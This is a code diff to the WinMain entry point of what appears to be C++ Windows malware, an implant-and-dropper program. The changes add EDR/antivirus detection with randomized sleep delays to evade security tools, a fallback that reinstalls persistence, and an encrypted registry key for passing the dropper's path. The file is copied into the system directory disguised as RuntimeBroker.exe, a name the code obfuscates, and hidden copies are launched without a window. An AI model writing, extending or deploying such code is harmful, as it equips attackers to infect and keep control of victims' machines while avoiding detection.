@@ -62,12 +62,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     wchar_t currentPathBuf[MAX_PATH];
     GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
     std::wstring currentPath(currentPathBuf);
-    std::transform(currentPath.begin(), currentPath.end(), currentPath.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
+    for (auto& c : currentPath) c = (wchar_t)::towlower(c);
 
     LOG_INFO("--- WINMAIN ---");
-    LOG_INFO("PATH: " + utils::ws2s(currentPath));
 
-    Sleep(10000 + (GetTickCount() % 10000));
+    // EDR/AV Detection and Delay
+    int jitter = evasion::Detection::GetJitterDelay();
+    if (jitter > 0) {
+        LOG_WARN("EDR/AV detected. Sleeping for " + std::to_string(jitter) + "s");
+        Sleep(jitter * 1000);
+    } else {
+        Sleep(10000 + (GetTickCount() % 10000));
+    }
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) return 1;
@@ -80,10 +86,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                 LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
-                Sleep(20000);
+                Sleep(30000);
                 persistence::establishPersistence(dropperPath);
             }
             RegCloseKey(hKey);
+        } else {
+            // If IPC fails, we still try to reinstall from whatever we can find
+            persistence::ReinstallPersistence();
         }
         beacon::Beacon implant;
         implant.run();
@@ -99,22 +108,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // Dropper
+    // Dropper Instance
     LOG_INFO("ROLE: Dropper.");
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
+        if (RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
+             LOG_INFO("IPC: Stored path successfully.");
+        }
         RegCloseKey(hKey);
-        LOG_INFO("IPC: Dropper path stored.");
     }
 
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
-        LOG_INFO("Attempting relocation...");
-
+        LOG_INFO("Attempting stealth relocation...");
         wchar_t systemPath[MAX_PATH];
         GetSystemDirectoryW(systemPath, MAX_PATH);
-        // Corrected "RuntimeBroker.exe": L"\x08\x2F\x34\x2E\x33\x37\x3F\x18\x28\x35\x31\x3F\x28\x74\x3F\x22\x3F"
         std::wstring rb = utils::DecryptW(L"\x08\x2F\x34\x2E\x33\x37\x3F\x18\x28\x35\x31\x3F\x28\x74\x3F\x22\x3F");
         std::wstring target = std::wstring(systemPath) + L"\\" + rb;
 
@@ -137,7 +145,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    LOG_WARN("Relocation failed. Launching stable copy.");
+    LOG_WARN("Relocation failed completely. Launching stable copy.");
     std::wstring persistPath = persistence::establishPersistence();
     if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
         LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
@@ -145,7 +153,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
         if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            LOG_INFO("Stable copy active.");
+            LOG_INFO("Stable copy launched.");
         }
     }
 
